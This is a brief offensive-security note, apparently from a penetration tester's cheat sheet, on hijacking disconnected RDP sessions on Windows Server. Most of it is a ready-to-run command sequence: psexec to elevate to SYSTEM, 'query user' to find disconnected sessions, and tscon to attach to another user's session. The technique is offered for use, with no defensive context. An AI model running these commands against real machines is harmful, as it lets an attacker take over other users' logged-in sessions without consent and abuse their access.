#psexec #tscon
# RDP Session Hijacking
- If an administrator uses RDP to log in to a machine and Instead of logging off the session, closes the RDP session, the session remains open on the server indefinately.
- If we have Administrative rights on a machine, we can reopen the session.
- Only works on Windows Server 2016
- We need to elevate from `Administrator` to `SYSTEM`.
```powershell
# First elevate to SYSTEM
psexec64.exe -s cmd.exe

# List the current rdp sessions
query user
# A Session with "Disc" state means that is left open by someone and currently not being used.

# Connect to active session using tscon
# tscon <id_to_connect_to> /dest:<current_session_name>
tscon 2 /dest:rdp-tcp#6
```
